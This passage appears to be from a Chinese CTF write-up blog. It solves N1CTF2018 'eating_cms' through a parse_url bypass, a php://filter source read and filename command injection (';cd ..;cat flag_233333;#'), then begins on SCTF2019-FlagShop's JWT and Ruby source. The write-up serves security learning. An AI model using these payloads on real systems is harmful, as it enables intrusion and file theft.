class="hljs-keyword">if</span> (<span class="hljs-variable">$res</span> == <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br> <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">register</span>(<span class="hljs-params"><span class="hljs-variable">$user</span>, <span class="hljs-variable">$pass</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$mysqli</span>;<br>    <span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">Filter</span>(<span class="hljs-variable">$user</span>);<br>    <span class="hljs-variable">$pass</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pass</span>);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into `albert_users`(`username_which_you_do_not_know`,`password_which_you_do_not_know_too`,`isadmin_which_you_do_not_know_too_too`) VALUES (&#x27;<span class="hljs-subst">$user</span>&#x27;,&#x27;<span class="hljs-subst">$pass</span>&#x27;,&#x27;0&#x27;)&quot;</span>;<br>    <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">sql_query</span>(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$mysqli</span>-&gt;insert_id;<br>&#125;<br> <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">logout</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-title function_ invoke__">session_destroy</span>();<br>    <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Location: index.php&quot;</span>);<br>&#125;<br> <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><hr><p>config.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(E_ERROR | E_WARNING | E_PARSE);<br><span class="hljs-title function_ invoke__">define</span>(BASEDIR, <span class="hljs-string">&quot;/var/www/html/a);//定义的常量</span><br><span class="hljs-string">define(FLAG_SIG, 1);//这个也是</span><br><span class="hljs-string"><span class="hljs-subst">$OPERATE</span> = array(&#x27;userinfo&#x27;,&#x27;upload&#x27;,&#x27;search&#x27;);</span><br><span class="hljs-string"><span class="hljs-subst">$OPERATE_admin</span> = array(&#x27;userinfo&#x27;,&#x27;upload&#x27;,&#x27;search&#x27;,&#x27;manage&#x27;);</span><br><span class="hljs-string"><span class="hljs-subst">$DBHOST</span> = &quot;</span>localhost<span class="hljs-string">&quot;;</span><br><span class="hljs-string"><span class="hljs-subst">$DBUSER</span> = &quot;</span>root<span class="hljs-string">&quot;;</span><br><span class="hljs-string"><span class="hljs-subst">$DBPASS</span> = &quot;</span>Nu1LCTF2018!@#qwe<span class="hljs-string">&quot;;</span><br><span class="hljs-string">//<span class="hljs-subst">$DBPASS</span> = &quot;</span><span class="hljs-string">&quot;;</span><br><span class="hljs-string"><span class="hljs-subst">$DBNAME</span> = &quot;</span>N1CTF<span class="hljs-string">&quot;;</span><br><span class="hljs-string"><span class="hljs-subst">$mysqli</span> = @new mysqli(<span class="hljs-subst">$DBHOST</span>, <span class="hljs-subst">$DBUSER</span>, <span class="hljs-subst">$DBPASS</span>, <span class="hljs-subst">$DBNAME</span>);</span><br><span class="hljs-string">if(mysqli_connect_errno())&#123;</span><br><span class="hljs-string">        echo &quot;</span>no sql connection<span class="hljs-string">&quot;.mysqli_connect_error();</span><br><span class="hljs-string">        <span class="hljs-subst">$mysqli</span>=null;  //文件大概就是链接数据库的操作</span><br><span class="hljs-string">        die();</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><hr><p>hacker.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;templates/hacker.html&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><hr><p>重点关注这段有flag的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_directory_guest</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$keywords</span> = [<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;manage&quot;</span>,<span class="hljs-string">&quot;ffffllllaaaaggg&quot;</span>,<span class="hljs-string">&quot;info&quot;</span>];<br>    <span class="hljs-variable">$uri</span> = <span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REQUEST_URI&quot;</span>]);<br>    <span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-variable">$uri</span>[<span class="hljs-string">&#x27;query&#x27;</span>], <span class="hljs-variable">$query</span>);<br><span class="hljs-comment">//    var_dump($query);</span><br><span class="hljs-comment">//    die();</span><br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$keywords</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$token</span>)<br>    &#123;<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$query</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$k</span>, <span class="hljs-variable">$token</span>))<br>                <span class="hljs-title function_ invoke__">hacker</span>();<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$v</span>, <span class="hljs-variable">$token</span>))<br>                <span class="hljs-title function_ invoke__">hacker</span>();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">parse_url</span><span class="hljs-params">()</span></span> 解析 URI，返回其组成部分（如 path、query 等）<br><span class="hljs-function"><span class="hljs-title">parse_str</span><span class="hljs-params">()</span></span> 将查询字符串解析为关联数组 <span class="hljs-variable">$query</span>（例如 <span class="hljs-selector-attr">[<span class="hljs-string">&quot;name&quot;</span> =&gt; <span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;id&quot;</span> =&gt; <span class="hljs-string">&quot;123&quot;</span>]</span>）<br><br><br>举个例子<br>http:<span class="hljs-comment">//example.com/page?file=flag.txt</span><br></code></pre></td></tr></table></figure><ul><li><code>parse_url()</code> 解析出 <code>query</code> 部分为 <code>file=flag.txt</code>。</li><li><code>parse_str()</code> 将其转换为 <code>[&quot;file&quot; =&gt; &quot;flag.txt&quot;]</code>。</li></ul><p>很明显这里要我们去读取这几个和flag有关的文件，但是这里会使用parse_url() parse_str()这两个函数，先进行解析，然后使用黑名单过滤，伪协议访问会被过滤掉，直接到hacker的界面，然后我们就要想如何绕过这两个函数</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">filter_directory()<span class="hljs-comment">;</span><br><br>include <span class="hljs-string">&quot;$page.php&quot;</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><hr><h2 id="parse-url漏洞"><a href="#parse-url漏洞" class="headerlink" title="parse_url漏洞"></a>parse_url漏洞</h2><p>有一个办法是使parse_url解析出错，从而无法进入下面的foreach判断。</p><p>只要在user.php前面加上三个&#x2F;即可绕过。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span><span class="hljs-regexp">/user.php?page=php:/</span><span class="hljs-regexp">/filter/</span>convert.base64-encode/resource=ffffllllaaaaggg<br></code></pre></td></tr></table></figure><p>ffffllllaaaaggg.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (FLAG_SIG != <span class="hljs-number">1</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;you can not visit it directly&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can find sth in m4aaannngggeee&quot;</span>; <br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>很明显提示我们去读m4aaannngggeee的源码</p><hr><p>m4aaannngggeee.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (FLAG_SIG != <span class="hljs-number">1</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;you can not visit it directly&quot;</span>);<br>&#125;<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;templates/upload.html&quot;</span>;<br> <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后发现这里给了一个upload的页面。</p><p><img src="/../image/N1CTF2018-eating_cms-3.png"></p><p>随便上传了几下发现是个假页面</p><p>用伪协议读取以下upllloadddd的源码</p><p><img src="/../image/N1CTF2018-eating_cms-4.png"></p><p>upllloadddd.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$allowtype</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;gif&quot;</span>,<span class="hljs-string">&quot;png&quot;</span>,<span class="hljs-string">&quot;jpg&quot;</span>);<br><span class="hljs-variable">$size</span> = <span class="hljs-number">10000000</span>;<br><span class="hljs-variable">$path</span> = <span class="hljs-string">&quot;./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;</span>;<br><span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>],<span class="hljs-variable">$path</span>.<span class="hljs-variable">$filename</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error:can not move&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error:not an upload file！&quot;</span>);<br>&#125;<br><span class="hljs-variable">$newfile</span> = <span class="hljs-variable">$path</span>.<span class="hljs-variable">$filename</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;file upload success&lt;br /&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$filename</span>;<br><span class="hljs-variable">$picdata</span> = <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;</span>.<span class="hljs-variable">$filename</span>.<span class="hljs-string">&quot; | base64 -w 0&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=&#x27;data:image/png;base64,&quot;</span>.<span class="hljs-variable">$picdata</span>.<span class="hljs-string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;error&#x27;</span>]&gt;<span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$newfile</span>);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Upload file error: &quot;</span>);<br>&#125;<br><span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">array_pop</span>(<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]));<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$ext</span>,<span class="hljs-variable">$allowtype</span>))&#123;<br>    <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$newfile</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这里有个很明显的rce漏洞</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$picdata</span> = system(<span class="hljs-string">&quot;cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;</span>.<span class="hljs-variable">$filename</span>.<span class="hljs-string">&quot; | base64 -w 0&quot;</span>);<br><br>并且这里还会输出<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;img src=&#x27;data:image/png;base64,&quot;</span>.<span class="hljs-variable">$picdata</span>.<span class="hljs-string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;<br></code></pre></td></tr></table></figure><p>这里会对我们的文件名进行命令执行，然后进行输出，但是这里他是对前后进行拼接，我们在这里传入;，让前后的命令分隔开，然后相当于拿到了shell</p><p>但是这里上传文件是假的，我们尝试去url一下我们之前的文件发现m4aaannngggeee有东西，也能进行文件上传</p><p><img src="/../image/N1CTF2018-eating_cms-5.png"></p><p>我们在这里上传然后抓包，修改filename为<code>;ls</code>试试，这里也可以改为<code>;ls;#</code>这样可以注释掉后面的base64编码语句，就不用我们去解码了，我这里用的是第一种。</p><p><img src="/../image/N1CTF2018-eating_cms-6.png"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">YXNzZXJ0CmJhY2tfYXNzZXJ0CmNvbmZpZy5waHAKZXJyb3JfcGFyYW1ldGVyLnBocApmZmZmbGxsbGFhYWFnZ2cucGhwCmZ1bmN0aW9uLnBocApndWVzdC5waHAKaGFja2VyLnBocApoYWNrZXIyLnBocAppbmRleC5waHAKaW5mby5waHAKbG9naW4ucGhwCmxvZ28ucG5nCm00YWFhbm5uZ2dnZWVlLnBocApyZWdpc3Rlci5waHAKdGVtcGxhdGVzCnVwZGF0ZWFkbWluLnBocAp1cGRhdGVhZG1pbi5waHB+<span class="hljs-attribute">CnVwZGF0ZWFkbWluMjMzMzMzMzMzMzMzMzMzLnBocAp1cGxsbG9hZGRkZC5waHAKdXBsb2FkX2IzYmIyY2ZlZDYzNzFkZmViMmRiMWRiY2NlYjEyNGQzCnVzZXIucGhwCg</span>==<br></code></pre></td></tr></table></figure><p>解码</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs stylus">assert<br>back_assert<br>config<span class="hljs-selector-class">.php</span><br>error_parameter<span class="hljs-selector-class">.php</span><br>ffffllllaaaaggg<span class="hljs-selector-class">.php</span><br>function<span class="hljs-selector-class">.php</span><br>guest<span class="hljs-selector-class">.php</span><br>hacker<span class="hljs-selector-class">.php</span><br>hacker2<span class="hljs-selector-class">.php</span><br>index<span class="hljs-selector-class">.php</span><br>info<span class="hljs-selector-class">.php</span><br>login<span class="hljs-selector-class">.php</span><br>logo<span class="hljs-selector-class">.png</span><br>m4aaannngggeee<span class="hljs-selector-class">.php</span><br>register<span class="hljs-selector-class">.php</span><br>templates<br>updateadmin<span class="hljs-selector-class">.php</span><br>updateadmin.php~<br>updateadmin233333333333333<span class="hljs-selector-class">.php</span><br>upllloadddd<span class="hljs-selector-class">.php</span><br>upload_b3bb2cfed6371dfeb2db1dbcceb124d3<br>user.php<br></code></pre></td></tr></table></figure><p>可以发现成功执行命令</p><p>然后尝试ls &#x2F;发现应该是过滤了&#x2F;，ls ..&#x2F;也不行。</p><p>那么如何查看根目录呢，因为是linux cd ..就可以了</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">;<span class="hljs-keyword">cd</span> <span class="hljs-string">..</span>;<span class="hljs-keyword">ls</span>;<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p><img src="/../image/N1CTF2018-eating_cms-7.png"></p><p>发现flag_233333</p><p>读flag</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">;<span class="hljs-keyword">cd</span> <span class="hljs-string">..</span>;cat flag_233333;<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>拿到flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;ad7c2097-cf50-<span class="hljs-number">4277</span>-b4a0-<span class="hljs-number">743025998689</span>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> 文件包含 </tag>
            
            <tag> 信息搜集 </tag>
            
            <tag> 文件上传 </tag>
            
            <tag> rce </tag>
            
            <tag> parse_url绕过 </tag>
            
            <tag> parse_str绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SCTF2019-FlagShop</title>
      <link href="/2025/04/24/SCTF2019-FlagShop/"/>
      <url>/2025/04/24/SCTF2019-FlagShop/</url>
      
        <content type="html"><![CDATA[<h1 id="SCTF2019-FlagShop"><a href="#SCTF2019-FlagShop" class="headerlink" title="SCTF2019-FlagShop"></a>SCTF2019-FlagShop</h1><p>一进来是这样的页面</p><p><img src="/../image/SCTF2019-FlagShop-1.png"></p><p>点reset会重置，按work我们的JinKela就会随机增加，先抓个包看看</p><p><img src="/../image/SCTF2019-FlagShop-2.png"></p><p>可以看到Cookie是标准的三段式，可以猜测是JWT，在<a href="https://jwt.io/">jwt网站</a>进行一个解密</p><p><img src="/../image/SCTF2019-FlagShop-3.png"></p><p>这里猜测我们只需要将jkl的值改写的超过买flag的值即可，所以我们现在需要寻找密钥才能修改。</p><p>查看robots.txt，提示我们访问&#x2F;filebak，找到源码</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;sinatra&#x27;</span><br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;sinatra/cookies&#x27;</span><br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;sinatra/json&#x27;</span><br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;jwt&#x27;</span><br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;securerandom&#x27;</span><br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;erb&#x27;</span><br> <br>set <span class="hljs-symbol">:public_folder</span>, <span class="hljs-title class_">File</span>.dirname(<span class="hljs-variable constant_">__FILE__</span>) + <span class="hljs-string">&#x27;/static&#x27;</span><br> <br><span class="hljs-variable constant_">FLAGPRICE</span> = <span class="hljs-number">1000000000000000000000000000</span><br><span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>] = <span class="hljs-title class_">SecureRandom</span>.hex(<span class="hljs-number">64</span>)<br> <br>configure <span class="hljs-keyword">do</span><br>  enable <span class="hljs-symbol">:logging</span><br>  file = <span class="hljs-title class_">File</span>.new(<span class="hljs-title class_">File</span>.dirname(<span class="hljs-variable constant_">__FILE__</span>) + <span class="hljs-string">&#x27;/../log/http.log&#x27;</span>,<span class="hljs-string">&quot;a+&quot;</span>)<br>  file.sync = <span class="hljs-literal">true</span><br>  use <span class="hljs-title class_">Rack</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:CommonLogger</span>, file<br><span class="hljs-keyword">end</span><br> <br>get <span class="hljs-string">&quot;/&quot;</span> <span class="hljs-keyword">do</span><br>  redirect <span class="hljs-string">&#x27;/shop&#x27;</span>, <span class="hljs-number">302</span><br><span class="hljs-keyword">end</span><br> <br>get <span class="hljs-string">&quot;/filebak&quot;</span> <span class="hljs-keyword">do</span><br>  content_type <span class="hljs-symbol">:text</span><br>  erb <span class="hljs-variable constant_">IO</span>.binread <span class="hljs-variable constant_">__FILE__</span><br><span class="hljs-keyword">end</span><br> <br>get <span class="hljs-string">&quot;/api/auth&quot;</span> <span class="hljs-keyword">do</span><br>  payload = &#123; <span class="hljs-symbol">uid:</span> <span class="hljs-title class_">SecureRandom</span>.uuid , <span class="hljs-symbol">jkl:</span> <span class="hljs-number">20</span>&#125;<br>  auth = <span class="hljs-variable constant_">JWT</span>.encode payload,<span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-string">&#x27;HS256&#x27;</span><br>  cookies[<span class="hljs-symbol">:auth</span>] = auth<br><span class="hljs-keyword">end</span><br> <br>get <span class="hljs-string">&quot;/api/info&quot;</span> <span class="hljs-keyword">do</span> <span class="hljs-comment">##验证JWT，返回其中的UID和jkl字段</span><br>  islogin<br>  auth = <span class="hljs-variable constant_">JWT</span>.decode cookies[<span class="hljs-symbol">:auth</span>],<span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-literal">true</span>, &#123; <span class="hljs-symbol">algorithm:</span> <span class="hljs-string">&#x27;HS256&#x27;</span> &#125;<br>  json(&#123;<span class="hljs-symbol">uid:</span> auth[<span class="hljs-number">0</span>][<span class="hljs-string">&quot;uid&quot;</span>],<span class="hljs-symbol">jkl:</span> auth[<span class="hljs-number">0</span>][<span class="hljs-string">&quot;jkl&quot;</span>]&#125;)<br><span class="hljs-keyword">end</span><br> <br>get <span class="hljs-string">&quot;/shop&quot;</span> <span class="hljs-keyword">do</span><br>  erb <span class="hljs-symbol">:shop</span><br><span class="hljs-keyword">end</span><br> <br>get <span class="hljs-string">&quot;/work&quot;</span> <span class="hljs-keyword">do</span> <span class="hljs-comment">##处理一个名为do的参数，根据条件修改JWT中的jkl字段</span><br>  islogin<br>  auth = <span class="hljs-variable constant_">JWT</span>.decode cookies[<span class="hljs-symbol">:auth</span>],<span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-literal">true</span>, &#123; <span class="hljs-symbol">algorithm:</span> <span class="hljs-string">&#x27;HS256&#x27;</span> &#125;<br>  auth = auth[<span class="hljs-number">0</span>]<br>  <span class="hljs-keyword">unless</span> params[<span class="hljs-symbol">:SECRET</span>].<span class="hljs-literal">nil</span>?<br>    <span class="hljs-keyword">if</span> <span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>].match(<span class="hljs-string">&quot;<span class="hljs-subst">#&#123;params[<span class="hljs-symbol">:SECRET</span>].match(<span class="hljs-regexp">/[0-9a-z]+/</span>)&#125;</span>&quot;</span>)<br>      puts <span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;FLAG&quot;</span>]<br>    <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">end</span><br> <br>  <span class="hljs-keyword">if</span> params[<span class="hljs-symbol">:do</span>] == <span class="hljs-string">&quot;<span class="hljs-subst">#&#123;params[<span class="hljs-symbol">:name</span>][<span class="hljs-number">0</span>,<span class="hljs-number">7</span>]&#125;</span> is working&quot;</span> <span class="hljs-keyword">then</span><br> <br>    auth[<span class="hljs-string">&quot;jkl&quot;</span>] = auth[<span class="hljs-string">&quot;jkl&quot;</span>].to_i + <span class="hljs-title class_">SecureRandom</span>.random_number(<span class="hljs-number">10</span>)<br>    auth = <span class="hljs-variable constant_">JWT</span>.encode auth,<span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-string">&#x27;HS256&#x27;</span><br>    cookies[<span class="hljs-symbol">:auth</span>] = auth<br>    <span class="hljs-variable constant_">ERB</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:new</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;<span class="hljs-subst">#&#123;params[<span class="hljs-symbol">:name</span>][<span class="hljs-number">0</span>,<span class="hljs-number">7</span>]&#125;</span> working successfully!&#x27;)&lt;/script&gt;&quot;</span>).result<br> <br>  <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br> <br>post <span class="hljs-string">&quot;/shop&quot;</span> <span class="hljs-keyword">do</span>  <span class="hljs-comment">##检查jkl是否足够高，如果足够则向JWT中添加flag字段。</span><br>  islogin<br>  auth = <span class="hljs-variable constant_">JWT</span>.decode 